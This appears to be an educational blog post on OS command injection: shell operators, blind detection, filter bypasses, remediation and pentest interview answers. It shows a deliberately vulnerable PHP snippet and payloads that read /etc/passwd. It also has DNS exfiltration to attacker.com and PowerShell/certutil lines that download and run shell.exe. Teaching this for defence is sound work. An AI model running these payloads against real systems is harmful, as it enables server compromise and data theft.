---
layout: default
title: "OS Command Injection: The Theory & Mechanics (Part 1)"
date: 2025-12-18
categories: [Web Security, Theory, OS Command Injection]
toc: true
---

# OS Command Injection: Understanding the Mechanics

OS Command Injection (also known as Shell Injection) is a critical vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application.

Unlike SQL Injection, which targets the database, or XSS, which targets the user, Command Injection targets the **server itself**. It essentially hands the attacker a terminal window into the backend infrastructure.

---

## 🔸 1. What is OS Command Injection?

Command injection occurs when an application passes user-supplied data (forms, cookies, HTTP headers) to a system shell without sufficient validation or escaping.

**Scenario:**
Imagine a web application that lets you "ping" a domain to check connectivity.
The backend code might look like this (PHP):
```
// VULNERABLE
$target = $_GET['domain'];
system("ping -c 4 " . $target);
```

If the user enters google.com, the server executes:

ping -c 4 google.com (Safe)

If the attacker enters google.com; whoami, the server executes:

ping -c 4 google.com; whoami

The semicolon `;` terminates the `ping` command, and the shell proceeds to execute `whoami`, returning the current user of the web server.

---

## ⚙️ 2. The Mechanics: How Shells Work

To exploit this, you must understand how command shells (like `bash` on Linux or `cmd.exe` on Windows) process input. They use special characters as operators to chain multiple commands together.

### The Injection Operators


| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only) and MacOS                |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only) and MacOS                |
semi-colon `;`, which will not work if the command was being executed with `Windows Command Line (CMD)` but still executed with `Windows PowerShell`.


---

## 🧨 3. Types of Command Injection

### 1️⃣ Visible (In-Band) Injection

The application returns the output of the executed command directly in the HTTP response.

**Example:** A "Check Stock" feature.

**Payload:** `storeId=1|whoami`
  
**Response:** `Product: Apple (Stock: 50) user: www-data`
  

### 2️⃣ Blind Injection

The application executes the command but does **not** return the output to the screen. You must use side-channels to confirm execution.

**Time-Based:** Make the server sleep. `|| ping -c 10 127.0.0.1 ||`.
  
**Output Redirection:** Write the output to a file in a public folder. `whoami > /var/www/static/out.txt`.
  
**Out-of-Band (OAST):** Force the server to make a DNS/HTTP request to your server. `nslookup attacker.com`.
    

---

## 🛠️ 4. Attack Mechanics: Bypassing Filters

Developers often try to "sanitize" input by blocking spaces or specific characters. Attackers use shell features to bypass these restrictions.

### A. Bypassing Space Filters

If the space character is blocked, use alternative delimiters:

1. **Tabs:** `%09`
    
2. **IFS Variable (Linux):** `${IFS}` (Internal Field Separator). `cat${IFS}/etc/passwd`.
    
3. **Redirection:** `<` or `>`. `cat</etc/passwd`.
    
4. **Brace Expansion:** `{ls,-la}`.
  

### B. Bypassing Blacklisted Keywords

If words like `cat` or `etc` are blocked:

1. **Concatenation:** `c'a't /e't'c/pa's'swd` (Shell ignores quotes).
    
2. **Variables:** `a=c;b=at;$a$b /etc/passwd`.
    
3. **Base64 Encoding:** `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash` (Encodes "cat /etc/passwd").
    
4. **Wildcards:** `/bin/c?? /?tc/p?sswd` (Matches `/bin/cat /etc/passwd`).
 

### C. Character Shifting

Using shell manipulation to generate blocked characters dynamically.

**Example:** Generating a slash `/` using `${PATH:0:1}` (taking the first char of the PATH variable).
    

---

## 🛡️ 5. Remediation & Defense Strategies

### 1️⃣ Avoid System Calls (The Golden Rule)

The best defense is to avoid calling OS commands entirely. Use built-in library functions instead.

1. **Bad:** `system("mkdir " + dirname)`
    
2. **Good:** `fs.mkdir(dirname)` (Node.js) or `os.mkdir(dirname)` (Python).
    

### 2️⃣ Strong Input Validation (Whitelist)

If you MUST use system commands, validate the input against a strict whitelist.

**Example:** If the input should be an ID, ensure it creates only numbers (`^[0-9]+$`).
    

### 3️⃣ Parameterization

Many languages allow passing arguments as an array of strings rather than a single concatenated string. This prevents the shell from interpreting injection operators.

1. **Python:** `subprocess.run(["ping", "-c", "4", target_ip])`
    
2. **Java:** `new ProcessBuilder("ping", "-c", "4", targetIP)`
    

---

## ❓ 6. Interview Corner: Common FAQs (Pentest & AppSec)

If you are interviewing for a security role, expect these questions.

### Q1: What is the difference between Command Injection and Code Injection?

**Answer:**

1. **Command Injection:** Executes **OS system commands** (e.g., `ls`, `whoami`, `netstat`). The vulnerability is in the _system shell_ usage.
    
2. **Code Injection:** Executes application code (e.g., PHP, Python, Java). The vulnerability is in the _language evaluation_ (like `eval()`).
    
3. _Note:_ Code injection often leads to Command injection, but they are distinct vulnerabilities.
    

### Q2: How do you detect Blind Command Injection?

Answer:

I would use time-based delays or out-of-band (OAST) techniques.

1. **Time-Based:** Inject `ping -c 10 127.0.0.1` (Linux) or `timeout 10` (Windows). If the response takes 10 seconds longer than usual, it confirms injection.
    
2. **OAST:** Inject `nslookup my-collaborator-id.net`. If I see a DNS lookup on my collaborator server, I know the command executed.
    

### Q3: Why is `nslookup` preferred over `ping` for data exfiltration?

Answer:

ping only confirms connectivity (ICMP). nslookup performs a DNS query, which allows us to embed data in the subdomain.

1. **Payload:** `nslookup` whoami`.attacker.com`
    
2. **Result:** My DNS logs show a query for `root.attacker.com`, effectively stealing the output of `whoami` even if the HTTP response is blind.
    

### Q4: You have RCE but spaces are filtered. How do you read `/etc/passwd`?

Answer:

I would use the Internal Field Separator ($IFS) environment variable in Linux, which defaults to a space/tab/newline.

**Payload:** `cat${IFS}/etc/passwd` or `cat$IFS/etc/passwd`.
  

### Q5: What is the difference between `;`, `&&`, and `&` operators?

**Answer:**

1. `;`: Runs commands sequentially regardless of success (Linux only).
    
2. `&&`: Runs the second command ONLY if the first succeeds (Exit code 0).
    
3. `&`: Runs the first command in the background (asynchronously) and immediately runs the second. Useful if the first command hangs or takes a long time.
    

### Q6: How would you bypass a filter blocking the forward slash `/` character?

Answer:

I can reference environment variables that contain slashes.

1. **Technique:** `${PATH:0:1}` usually returns `/` on Linux systems.
    
2. **Payload:** `cat ${PATH:0:1}etc${PATH:0:1}passwd`.
    

### Q7: Can you perform Command Injection inside a quoted string? e.g., `echo "User Input"`?

Answer:

Yes, by closing the quote first.

1. **Input:** `test"; whoami; echo "`
    
2.Result: echo "test"; whoami; echo ""
    
    The server executes the echo, then executes whoami.


### Q8: What tools can automate Command Injection detection?

**Answer:**

1. **Burp Suite Professional:** The active scanner is excellent at detecting OS injection via time-delays and collaborator payloads.
    
2. **Commix:** An automated tool specifically designed to test and exploit command injection vulnerabilities.
    

### Q9: Why is `shell=True` dangerous in Python?

Answer:

When using subprocess.run or Popen in Python, setting shell=True invokes the system shell (/bin/sh) to execute the command string. This subjects the input to shell expansion and interpretation of characters like ; or |, making injection possible. shell=False passes arguments directly to the OS kernel, preventing injection.

### Q10: How do you escalate privileges after gaining a shell via Command Injection?

**Answer:**

1. **Recon:** Run `uname -a`, `id`, `sudo -l` to check kernel version and permissions.
    
2. **Persistence:** Try to write a webshell to the webroot or add an SSH key.
    
3. **Escalation:** Look for SUID binaries, misconfigured cron jobs, or kernel exploits (Dirty COW, PwnKit) to elevate from `www-data` to `root`.
    

---

## 🎭 7. Scenario-Based Questions

### 🎭 Scenario 1: The "Feedback" Form

Context: A feedback form submits comments to an admin. You suspect the backend uses mail command to send these. You try injecting ; but get an "Invalid Character" error.

The Question: How do you proceed?

The "Hired" Answer:

"The application likely has a blacklist filter. I would fuzz for other separators like |, &, or %0a (newline).

If those are blocked, I would try shell expansions like $(sleep 5) inside the input, as some mail programs might evaluate subshells. I would also try encoding characters (URL/Hex) if the WAF is decoding them before the backend script runs."

### 🎭 Scenario 2: Windows Server RCE

Context: You have confirmed Command Injection on a Windows server (IIS). You want to download a malicious executable (shell.exe) from your attacker machine. wget and curl are missing.

The Question: How do you download the file?

The "Hired" Answer:

"On Windows, I would use PowerShell or CertUtil.

1. **PowerShell:** `powershell -c "iwr -uri http://attacker.com/shell.exe -outfile C:\Windows\Temp\shell.exe"`
    
2. CertUtil: certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe
    
    Then I would execute it using C:\Windows\Temp\shell.exe."
    

### 🎭 Scenario 3: The "Ping" Utility

Context: A network tool allows you to ping IPs. It validates that the input contains only numbers and dots.

The Question: Is it secure?

The "Hired" Answer:

"Not necessarily.

1. **IPv6:** Does it allow colons?
    
2. **Integer IPs:** `2130706433` is valid for `127.0.0.1`.
    
3. Redirection: Does it allow < or >? I might not be able to execute code, but I could overwrite files if redirection is allowed.
    
    However, if the regex strictly enforces ^[0-9.]+$, it is likely secure against standard Command Injection."
    

### 🎭 Scenario 4: Blind Exfiltration blocked by Firewalls

Context: You have Blind RCE. You tried nslookup, but the firewall blocks all outbound DNS (UDP 53) and HTTP (TCP 80/443). You can't write to the webroot.

The Question: How do you exfiltrate data?

The "Hired" Answer:

"I would try Time-Based Exfiltration.

I can write a script to iterate through the output of a command (like whoami) character by character.

- Logic: `if (first char == 'r') sleep 5`.
    
- If the server sleeps, I know the first letter is 'r'. I repeat this for every character. It's slow, but bypasses all egress firewalls."
    

### 🎭 Scenario 5: The "Filename" Parameter

Context: A file download feature takes filename=report.pdf. You try filename=;ls and it fails. You try filename=..%2f..%2fetc%2fpasswd and it works (LFI).

The Question: Can this become Command Injection?

The "Hired" Answer:

"It depends on how the file is retrieved.

1. If the code uses `open()` or `read()`, it's just LFI.
    
2. However, if the code uses a system command like `cat` or `type` to read the file (e.g., `system("cat " + filename)`), then yes.
    
3. I would verify by trying to inject command separators into the filename again, perhaps using `%0a` (newline) which is often overlooked in filename validation logic."
    

---

## 🛑 Summary of Part 1

1. **Concept:** Injecting shell operators into user input to execute OS commands.
    
2. **Impact:** Full server compromise (RCE).
    
3. **Attack:** Use separators (`;`, `|`, `&`, `$()`) to break out of the intended command.
    
4. **Defense:** Avoid system calls; use strict whitelisting and parameterization.
